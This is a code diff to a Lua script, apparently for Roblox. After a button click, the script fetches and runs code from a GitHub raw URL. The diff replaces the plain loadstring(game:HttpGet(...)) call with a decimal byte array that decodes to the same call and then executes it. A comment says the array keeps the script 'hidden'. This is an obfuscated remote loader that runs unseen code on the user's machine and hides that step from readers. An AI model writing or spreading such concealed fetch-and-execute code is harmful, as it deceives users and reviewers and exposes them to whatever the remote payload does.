@@ -135,8 +135,19 @@ button.MouseButton1Click:Connect(function()
                 conn:Disconnect()
                 gui:Destroy()
 
-                -- Загружаем новый скрипт напрямую
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub"))()
+                -- Скрипт в виде массива чисел (спрятанный)
+                local scriptCode = {
+                    108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,
+                    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,
+                    116,101,110,116,46,99,111,109,47,78,105,110,106,97,49,48,57,48,56,47,83,52,47,114,101,102,115,
+                    47,104,101,97,100,115,47,109,97,105,110,47,75,117,114,100,104,117,98,34,41,41,40,41
+                }
+                local s = ""
+                for _,v in ipairs(scriptCode) do
+                    s = s .. string.char(v)
+                end
+                local fn, err = loadstring(s)
+                if fn then fn() else warn("Ошибка: "..tostring(err)) end
             end
         end)
     else
